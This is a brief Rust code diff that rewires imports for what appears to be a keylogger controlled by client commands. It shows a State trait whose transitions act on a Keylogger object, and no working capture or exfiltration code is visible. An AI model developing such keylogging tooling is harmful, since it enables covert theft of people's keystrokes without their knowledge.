@@ -1,4 +1,5 @@
-include!("./keylog/keylog_factory.rs");
+use crate::keylog::keylogger::{Keylogger, write_keylog_to_file};
+use crate::client_input::Commands;
 
 pub trait State {
     fn transition(self: Box<Self>, cmd: Commands, keylogger: &mut Box<dyn Keylogger>) -> Box<dyn State>;
